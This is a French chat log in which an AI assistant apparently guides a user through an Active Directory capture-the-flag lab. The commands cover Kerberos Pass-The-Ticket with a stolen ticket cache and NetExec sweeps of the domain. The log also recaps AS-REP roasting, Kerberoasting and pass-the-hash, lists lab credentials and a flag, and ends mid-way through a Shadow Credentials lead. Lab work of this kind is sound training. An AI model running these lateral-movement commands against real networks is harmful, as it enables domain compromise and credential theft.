-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_cd73aa6b_10.13.37.123_20260518125141.ccache'

[May 18, 2026 - 10:50:20 (CEST)] exegol-free /workspace # export KRB5CCNAME="/root/.nxc/modules/lsassy/TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_0f882254_10.13.37.123_20260518184824.ccache"

[May 18, 2026 - 10:50:58 (CEST)] exegol-free /workspace # klist

Ticket cache: FILE:/root/.nxc/modules/lsassy/TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_0f882254_10.13.37.123_20260518184824.ccache

Default principal: k.udele@CELESTINA.SHOP



Valid starting       Expires              Service principal

05/18/2026 10:48:24  05/18/2026 20:48:24  krbtgt/CELESTINA.SHOP@CELESTINA.SHOP

renew until 05/25/2026 10:48:24

[May 18, 2026 - 10:51:03 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'k.udele' -k -d celestina.shop

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 10:51:15 (CEST)] exegol-free /workspace # 

Ah, intéressant ! NetExec s'est lancé, a scanné les machines, mais aucun résultat de connexion (ni [+] ni [-]) n'est apparu.

C'est un problème classique lié à la configuration DNS sous Linux lorsqu'on fait du Pass-The-Ticket. Kerberos est extrêmement pointilleux sur la résolution des noms : il refuse de fonctionner avec des adresses IP. Il a besoin de parler aux machines avec leur nom complet (FQDN). Or, ton environnement exegol-free ne connaît pas l'adresse IP du contrôleur de domaine celestina.shop.

Voici comment corriger ça rapidement.

Étape 1 : Configurer la résolution DNS (Le fichier hosts)
On va dire manuellement à ta machine Linux où se trouve le contrôleur de domaine. L'adresse IP de ton DC est 10.13.37.42.

Lance cette commande pour ajouter l'entrée dans ton fichier /etc/hosts :

Bash
echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" >> /etc/hosts
Étape 2 : Relancer l'attaque PtT
Maintenant que ton système sait comment contacter le domaine celestina.shop, on relance l'attaque NetExec.

Lance cette commande :

Bash
nxc smb 10.13.37.0/24 -u 'k.udele' -k -d celestina.shop
Si tout se passe bien, tu devrais enfin voir les lignes de tentatives de connexion ([+] ou [-]). Et si la chance sourit au pentester, tu verras un magnifique (Pwn3d!) sur une des machines de la liste ! Dis-moi ce qu'il en est !

[May 18, 2026 - 10:51:15 (CEST)] exegol-free /workspace # echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" >> /etc/hosts

[May 18, 2026 - 10:51:42 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'k.udele' -k -d celestina.shop

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

Bienvenue dans ce qu'on appelle affectueusement "l'enfer de Kerberos" !

NetExec a scanné le réseau, mais il n'a fait aucune tentative de connexion. C'est un comportement typique et un pur problème de configuration d'infrastructure – le genre de détail technique critique qui fait toute la différence quand on automatise des environnements complexes ou qu'on intègre la sécurité dans des processus de déploiement continus.

Voici pourquoi ça bloque : Kerberos est un protocole extrêmement paranoïaque. Il refuse catégoriquement de s'authentifier sur une simple adresse IP. Il exige de communiquer avec le nom exact de la machine (son FQDN, par exemple WK-132.celestina.shop). Pour ce faire, il doit d'abord interroger le serveur DNS de l'entreprise.

Or, pour l'instant, ton conteneur Exegol utilise un DNS public par défaut (comme 8.8.8.8) qui ne connaît absolument pas le réseau interne de CELESTINA. L'astuce du fichier /etc/hosts était une bonne idée pour le Contrôleur de Domaine, mais elle ne suffit pas pour scanner tout un parc de 250 adresses IP !

La vraie solution : Changer le DNS de ton Exegol
Puisque le Contrôleur de Domaine (10.13.37.42) fait aussi office de serveur DNS pour tout le réseau cible, nous allons tout simplement forcer ton système Linux à l'utiliser.

Lance cette commande pour écraser la configuration DNS de ta machine :

Bash
echo "nameserver 10.13.37.42" > /etc/resolv.conf
La contre-attaque
Maintenant que ton système est capable de traduire toutes les adresses IP en noms de machines valides pour Kerberos, relance exactement la même attaque avec ton ticket volé :

Bash
nxc smb 10.13.37.0/24 -u 'k.udele' -k -d celestina.shop
Ouvre l'œil ! Cette fois-ci, les tentatives vont s'afficher. Cherche la ligne qui te donnera un accès (Pwn3d!). Dès que tu l'as trouvée, relance la commande spécifiquement sur l'IP de cette machine en y ajoutant -x 'ipconfig' ! On touche au but !

[May 18, 2026 - 10:53:49 (CEST)] exegol-free /workspace # echo "nameserver 10.13.37.42" > /etc/resolv.conf

[May 18, 2026 - 10:58:03 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'k.udele' -k -d celestina.shop

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

C'est encore une subtilité de l'enfer Kerberos !

Ton fichier resolv.conf est correct, mais NetExec a un comportement très particulier avec le flag -k (Kerberos) : il refuse de déclencher l'authentification si on lui donne une plage d'adresses IP (10.13.37.0/24). Pour que Kerberos fonctionne, il a impérativement besoin qu'on lui fournisse les noms complets des machines (FQDN) dans la ligne de commande, pour pouvoir générer les bons tickets de service (SPN).

Puisque ton scan a listé toutes les machines présentes, nous allons simplement les mettre dans un fichier texte et dire à NetExec d'attaquer cette liste de noms.

Étape 1 : Créer la liste des cibles
Copie-colle ce bloc entier dans ton terminal. Il va créer un fichier targets.txt contenant les noms DNS exacts de toutes les machines trouvées :

Bash
cat << 'EOF' > targets.txt
WK-010.celestina.shop
WK-020.celestina.shop
WK-030.celestina.shop
WK-044.celestina.shop
WK-101.celestina.shop
WK-111.celestina.shop
WK-123.celestina.shop
WK-124.celestina.shop
WK-132.celestina.shop
WK-137.celestina.shop
WK-155.celestina.shop
WK-202.celestina.shop
WK-222.celestina.shop
WK-234.celestina.shop
DC-CELESTINA.celestina.shop
EOF
Étape 2 : Lancer l'attaque finale (Pass-The-Ticket)
Maintenant, on lance NetExec en lui donnant ce fichier cible. Avec ton ticket en mémoire, la magie Kerberos va enfin opérer.

Bash
nxc smb targets.txt -u 'k.udele' -k
Les lignes d'authentification vont enfin s'afficher. Reste à l'affût de la ligne qui affichera un accès administrateur (Pwn3d!). Une fois trouvée, il suffira de relancer la commande sur cette machine spécifique avec -x 'ipconfig' pour confirmer si c'est bien la passerelle que nous cherchons depuis le début.

Voici les obj flag que j'ai pas encore fait, on continue notre investigation mais c'est juste poru que tu l'ai en mémoire



Un café vraiment pas sécurisé

Catégorie

Kerberos

Difficulté

Points

+100 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Quel est le problème avec aucune préauth de toute façon ?

CAAS ou Café as a service, what else ?

Catégorie

Kerberos

Difficulté

Points

+100 points

Type

Standard

Objectif résolu par 5.6% des équipes.Liste des résolutions

Description///

Qu'est-ce qu'un café, sinon un misérable petit tas de secrets ?

Le goût par défaut est le meilleur goût

Catégorie

Network

Difficulté

Points

+100 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Par défaut c'est ok, mais change le stp

Passe moi le sel, euh le hash

Catégorie

Network

Difficulté

Points

+200 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

La reutilisation de mot de passe est un calvaire, mais les NTHash également !

Décrivez précisement, mais pas trop

Catégorie

Network

Difficulté

Points

+100 points

Type

Standard

Objectif résolu par 11.1% des équipes.Liste des résolutions

Description///

Certains champs feraient mieux de ne pas être touchés si c'est pour faire fuiter des informations sensibles

Libéré, délivré, non contraint

Catégorie

Kerberos

Difficulté

Points

+400 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Parfois il faut savoir quand déléguer

Un secret trop partagé n'est plus secret

Catégorie

Network

Difficulté

Points

+100 points

Type

Standard

Objectif résolu par 11.1% des équipes.Liste des résolutions

Description///

Le probleme est que n'importe qui sur le domaine peut le trouver et le lire

Environnement en perpetuel changement

Catégorie

Network

Difficulté

Points

+200 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Avez-vous promené le chien récemment ?

Cible acquise, protocole KRB enclenché

Catégorie

Kerberos

Difficulté

Points

+200 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Avez-vous promené le chien récemment ? (oui je l'ai déjà dit. non ce n'est pas une erreur)

Je vis dans l'ombre, je suis ténébreux

Catégorie

Kerberos

Difficulté

Points

+400 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Avez-vous promené le chien récemment ? (toujours pas une erreur)

Caché dans le secret LSA

Catégorie

Bonus

Difficulté

Points

+100 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Ces données ne servent à rien, autant mettre un flag

Un RDP non-necessaire

Catégorie

Bonus

Difficulté

Points

+100 points

Type

Standard

Objectif résolu par 0% des équipes.Liste des résolutions

Description///

Puisque que ce n'est pas obligatoire, pourquoi l'as tu fait ?

C'est bien noté et sauvegardé dans ma mémoire spatio-temporelle !

Mais j'ai une excellente nouvelle pour toi : en lisant ta liste, je me rends compte que ton investigation a été tellement efficace que tu as déjà résolu 5 de ces challenges sans même t'en rendre compte ! Regarde bien, tu as déjà accompli tout ça :

Un café vraiment pas sécurisé (100 pts) : "aucune préauth" -> C'est l'attaque AS-REP Roasting qu'on a faite sur j.vabre au tout début !

CAAS ou Café as a service (100 pts) : "Qu'est-ce qu'un café, sinon un misérable petit tas de secrets ?" -> C'est l'attaque Kerberoasting qu'on a réussie sur le compte de service g.clooney.

Le goût par défaut est le meilleur goût (100 pts) : "Par défaut c'est ok, mais change le stp" -> C'est le PDF qu'on a trouvé sur le partage HUB avec le mot de passe C3L3stin4!Us3r.

Passe moi le sel, euh le hash (200 pts) : "La reutilisation de mot de passe est un calvaire..." -> C'est exactement l'attaque Pass-The-Hash que l'on vient de faire en réutilisant le hash fafb12... de l'Administrateur local !

Caché dans le secret LSA (100 pts) : "Ces données ne servent à rien, autant mettre un flag" -> C'est littéralement le flag4:CCHDFLM{DumP1nG_H45h3s_L1k3_4_B0ss} qu'on vient d'extraire de la mémoire de WK-123 il y a quelques minutes !

Tu peux déjà aller valider tous ces points sur ta plateforme de CTF !

Pour le reste de la liste, les indices sont très bavards : le "chien" fait évidemment référence à BloodHound (qu'on a lancé au début), "l'ombre" évoque l'attaque Shadow Credentials, et "non contraint" cible l'Unconstrained Delegation. On est exactement sur la bonne voie.

On garde tout ça en tête, mais pour l'instant, restons concentrés sur notre attaque Pass-The-Ticket en cours. Dis-moi ce qu'a donné cette fameuse commande avec le ticket de k.udele :

Bash
nxc smb targets.txt -u 'k.udele' -k
As-tu enfin obtenu un (Pwn3d!) ?

[May 18, 2026 - 10:58:10 (CEST)] exegol-free /workspace # cat << 'EOF' > targets.txt

WK-010.celestina.shop

WK-020.celestina.shop

WK-030.celestina.shop

WK-044.celestina.shop

WK-101.celestina.shop

WK-111.celestina.shop

WK-123.celestina.shop

WK-124.celestina.shop

WK-132.celestina.shop

WK-137.celestina.shop

WK-155.celestina.shop

WK-202.celestina.shop

WK-222.celestina.shop

WK-234.celestina.shop

DC-CELESTINA.celestina.shop

EOF

[May 18, 2026 - 11:01:15 (CEST)] exegol-free /workspace # nxc smb targets.txt -u 'k.udele' -k

SMB         DC-CELESTINA.celestina.shop 445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         WK-030.celestina.shop 445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-124.celestina.shop 445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-010.celestina.shop 445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-111.celestina.shop 445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-137.celestina.shop 445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-101.celestina.shop 445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-123.celestina.shop 445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-155.celestina.shop 445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-222.celestina.shop 445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-132.celestina.shop 445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-234.celestina.shop 445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-202.celestina.shop 445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-020.celestina.shop 445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-044.celestina.shop 445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

Running nxc against 15 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 11:01:23 (CEST)] exegol-free /workspace # 

L'enfer de Kerberos te met vraiment à l'épreuve !

NetExec a scanné les cibles, a bien lu le fichier, mais il n'a toujours fait aucune tentative de connexion.

Voici l'explication : dans la commande précédente, on a précisé l'utilisateur (-u) et le protocole (-k pour Kerberos), mais comme on n'a fourni ni mot de passe (-p) ni hash (-H), NetExec a considéré qu'on voulait simplement faire de la reconnaissance passive (sans authentification).

Pour forcer NetExec à utiliser le ticket que tu as exporté dans la variable KRB5CCNAME, il faut lui donner l'argument explicite --use-kcache.

L'attaque (la vraie)
Lance cette commande en incluant le domaine et le paramètre magique pour lire ton ticket :

Bash
nxc smb targets.txt -u 'k.udele' -d celestina.shop --use-kcache
Dès que la magie opérera, les tentatives d'authentification s'afficheront. Lorsque tu repéreras enfin la machine compromise affichant l'accès administrateur (Pwn3d!), tu n'auras plus qu'à relancer cette même commande en ciblant uniquement cette machine et en ajoutant l'argument -x 'ipconfig' à la fin pour vérifier si elle possède la fameuse carte réseau cachée !

[May 18, 2026 - 11:01:23 (CEST)] exegol-free /workspace # nxc smb targets.txt -u 'k.udele' -d celestina.shop --use-kcache

SMB         DC-CELESTINA.celestina.shop 445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         WK-124.celestina.shop 445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-123.celestina.shop 445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-030.celestina.shop 445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-111.celestina.shop 445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-137.celestina.shop 445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-155.celestina.shop 445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-101.celestina.shop 445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-132.celestina.shop 445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-010.celestina.shop 445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-234.celestina.shop 445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-222.celestina.shop 445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-044.celestina.shop 445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         WK-202.celestina.shop 445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         DC-CELESTINA.celestina.shop 445    DC-CELESTINA     [+] celestina.shop\k.udele from ccache 

SMB         WK-124.celestina.shop 445    WK-124           [+] celestina.shop\k.udele from ccache 

SMB         WK-123.celestina.shop 445    WK-123           [+] celestina.shop\k.udele from ccache 

SMB         WK-030.celestina.shop 445    WK-030           [+] celestina.shop\k.udele from ccache 

SMB         WK-111.celestina.shop 445    WK-111           [+] celestina.shop\k.udele from ccache 

SMB         WK-137.celestina.shop 445    WK-137           [+] celestina.shop\k.udele from ccache 

SMB         WK-155.celestina.shop 445    WK-155           [+] celestina.shop\k.udele from ccache 

SMB         WK-101.celestina.shop 445    WK-101           [+] celestina.shop\k.udele from ccache 

SMB         WK-132.celestina.shop 445    WK-132           [+] celestina.shop\k.udele from ccache 

SMB         WK-010.celestina.shop 445    WK-010           [+] celestina.shop\k.udele from ccache 

SMB         WK-234.celestina.shop 445    WK-234           [+] celestina.shop\k.udele from ccache 

SMB         WK-222.celestina.shop 445    WK-222           [+] celestina.shop\k.udele from ccache 

SMB         WK-044.celestina.shop 445    WK-044           [+] celestina.shop\k.udele from ccache 

SMB         WK-202.celestina.shop 445    WK-202           [+] celestina.shop\k.udele from ccache 

Running nxc against 15 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 11:03:18 (CEST)] exegol-free /workspace # 

C'est une excellente nouvelle, mais qui s'accompagne d'une petite frustration typique du pentest !

L'attaque Pass-The-Ticket a parfaitement fonctionné : tu vois des [+] partout, ce qui prouve que les machines t'acceptent en tant que k.udele. Mais tu n'as obtenu aucun (Pwn3d!).

Cela signifie que k.udele est un utilisateur valide du domaine, mais qu'il n'est Administrateur Local sur aucune de ces machines.

Le changement de stratégie (On passe au niveau supérieur)
Quand on est bloqué sur le réseau local (SMB), on s'attaque directement au cerveau du réseau : l'Active Directory (LDAP).

C'est là que ton indice de CTF prend tout son sens : "Avez-vous promené le chien récemment ?". C'est une référence directe à BloodHound (le chien de Saint-Hubert). Et souviens-toi de ton autre indice : "Je vis dans l'ombre, je suis ténébreux". C'est une référence à une attaque très spécifique de l'Active Directory appelée Shadow Credentials.

Pour faire cette attaque, un utilisateur doit posséder des droits spéciaux (comme GenericAll ou GenericWrite) sur un autre compte plus privilégié (par exemple un administrateur du domaine ou un serveur de rebond).

Étape 1 : Interroger le chien de chasse
Tu as déjà les fichiers générés par BloodHound dans ton dossier (20260518092435_users.json, etc.). On va regarder ce que k.udele a le droit de faire dans l'Active Directory.

Lance cette commande pour filtrer le fichier JSON et extraire les informations de cet utilisateur (on utilise grep pour chercher autour de son nom) :

Bash
grep -i -A 40 '"samaccountname":"k.udele"' 20260518092435_users.json
Étape 2 : Confirmer l'accès à l'Active Directory
En parallèle, vérifions que ton ticket Kerberos te permet bien d'interroger directement la base LDAP du Contrôleur de Domaine. NetExec a des modules spéciaux pour ça.

Lance cette commande :

Bash
nxc ldap DC-CELESTINA.celestina.shop -u 'k.udele' -k
Regarde attentivement la sortie du grep sur le fichier JSON. Vois-tu une section Aces ou OutboundControlRights qui indiquerait que k.udele possède un droit sur une autre machine (comme WK-XXX$) ou sur un autre utilisateur ? Partage-moi ce que tu trouves !

[May 18, 2026 - 11:03:18 (CEST)] exegol-free /workspace # grep -i -A 40 '"samaccountname":"k.udele"' 20260518092435_users.json

[May 18, 2026 - 11:04:22 (CEST)] exegol-free /workspace # nxc ldap DC-CELESTINA.celestina.shop -u 'k.udele' -k

LDAP        DC-CELESTINA.celestina.shop 389    DC-CELESTINA     [*] Windows Server 2022 Build 20348 (name:DC-CELESTINA) (domain:celestina.shop) (signing:None) (channel binding:Never) 

C'est le métier qui rentre ! Tu es tombé dans deux pièges très classiques des outils de ligne de commande en pentest.

1. Le piège de NetExec (LDAP)
Si tu regardes ta commande nxc ldap, tu as bien mis le -k, mais... tu as oublié la formule magique --use-kcache (et le domaine -d celestina.shop) que nous avions utilisée pour SMB ! Sans cela, NetExec essaie de faire une requête LDAP anonyme au lieu d'utiliser ton ticket volé.

La commande corrigée pour vérifier ton accès LDAP :

Bash
nxc ldap DC-CELESTINA.celestina.shop -u 'k.udele' -d celestina.shop --use-kcache
(Si ça marche, tu verras enfin un [+] celestina.shop\k.udele s'afficher).

2. Le piège de BloodHound (JSON)
Ton grep n'a rien renvoyé pour deux raisons :

Les fichiers JSON générés par BloodHound contiennent souvent des espaces ou une casse différente (par exemple "SAMAccountName": "K.UDELE@CELESTINA.SHOP"). Ta recherche stricte ne correspondait pas.

Dans la logique de BloodHound, les droits d'attaque (ACEs) sont souvent inscrits sur la cible de l'attaque, pas sur l'attaquant ! Donc si k.udele a les droits de compromettre un ordinateur, son nom apparaîtra dans le fichier computers.json, pas dans users.json.

La solution "bourrin" et efficace :
On va demander à grep de chercher le nom de k.udele dans absolument tous les fichiers JSON, en ignorant la casse, et de nous afficher les 15 lignes au-dessus et en dessous pour avoir le contexte.

Lance cette commande :

Bash
grep -i -C 15 "k.udele" *.json
Regarde bien les résultats de ce gros grep. Tu cherches une section qui s'appelle Aces, OutboundControlRights, ou un bloc qui indique que k.udele possède un droit de type GenericAll, GenericWrite, ou WriteOwner sur un autre objet (comme le DC-CELESTINA ou un compte Administrator).

Dis-moi ce que tu trouves dans ce bloc de texte, c'est là que se cache notre fameuse attaque "Shadow Credentials" !

voici le fichier

C'est une excellente initiative d'avoir extrait le contenu du fichier users.json ! En pentest, quand une piste s'essouffle (comme notre ticket pour k.udele), on fouille dans les données de reconnaissance pour pivoter.

Et là, en lisant ce fichier, tu viens de trouver la solution exacte pour le challenge à 400 points : "Je vis dans l'ombre, je suis ténébreux".

L'analyse du fichier (La faille "Shadow Credentials")
Oublions k.udele une seconde et regardons de près cet extrait de ton fichier JSON concernant l'utilisateur K.CHEH :

Si l'on regarde la section "Aces" (qui définit qui a des droits sur le compte k.cheh), on trouve cette pépite :

JSON
{
    "RightName": "AddKeyCredentialLink",
    "IsInherited": false,
    "PrincipalSID": "S-1-5-21-3433736088-161430583-3583626515-1184",
